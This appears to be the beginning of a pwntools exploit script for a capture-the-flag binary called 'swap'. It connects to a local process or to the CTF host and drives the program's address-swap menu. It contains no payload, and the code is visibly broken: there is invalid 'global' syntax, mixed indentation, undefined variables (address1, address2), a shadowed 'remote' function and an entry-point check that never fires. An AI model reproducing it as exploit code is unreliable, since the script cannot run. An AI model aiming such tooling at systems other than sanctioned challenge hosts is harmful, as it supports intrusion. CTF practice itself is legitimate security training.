#!/usr/bin/env python

from pwn import *

context(arch="amd64", os="linux", bits=64, log_level="INFO", terminal=["tmux", "splitw", "-h"])
global local=True
global remote=False
e=ELF("./swap")

def conn():
    return process(["./swap"], env={'LD_PRELOAD':"./libc.so.6"}) if local else remote('pwn1.chal.ctf.westerns.tokyo', 19937)

def send(s):
    print s
    r.sendline(s)
    
def swap(addr1, addr2):
    print r.recvuntil("choice:\n")
    send(str(1))
    print r.recvuntil('Please input 1st addr')
	send(str(address1))
	print r.recvuntil('Please input 2nd addr')
	send(str(address2))
	print r.recvuntil('Your choice: \n')
	send('2')

def main():
    r=conn()

if __name__=="__main":
    main()